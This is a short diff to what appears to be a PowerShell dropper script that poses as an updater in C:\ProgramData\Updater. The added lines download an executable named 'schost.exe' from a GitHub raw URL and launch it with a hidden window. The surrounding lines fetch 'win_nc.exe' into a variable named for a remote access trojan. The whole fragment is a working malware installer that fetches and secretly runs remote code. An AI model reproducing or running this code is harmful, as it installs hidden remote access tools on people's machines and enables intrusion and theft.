@@ -13,6 +13,10 @@ $workDir = "C:\ProgramData\Updater"
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 
 Write-Host "[3/7]" -ForegroundColor Cyan
+$schostPath = "$workDir\schost.exe"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/schost.exe" -OutFile $schostPath
+Start-Process -FilePath $schostPath -WindowStyle Hidden
+
 $ratPath = "$workDir\win_nc.exe"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/win_nc.exe" -OutFile $ratPath
 
